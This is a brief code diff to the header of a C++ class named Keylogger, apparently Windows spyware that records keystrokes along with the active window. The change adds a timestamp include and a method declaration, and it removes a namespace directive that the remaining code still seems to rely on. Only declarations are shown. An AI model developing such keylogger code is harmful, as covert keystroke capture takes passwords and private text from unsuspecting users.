@@ -8,8 +8,7 @@
 #include <Psapi.h>
 #include <string>
 #include <memory>
-
-using namespace std;
+#include <ctime>
 
 class Keylogger {
 public:
@@ -26,6 +25,7 @@ private:
 	HWND lastActiveWindow;
 
 	void keyboardHandler(const wchar_t* key);
+	void addWindowTimeStamps();
 
 	static char charBuffer[1024];
 	static string wcharToStr(const wchar_t* str);
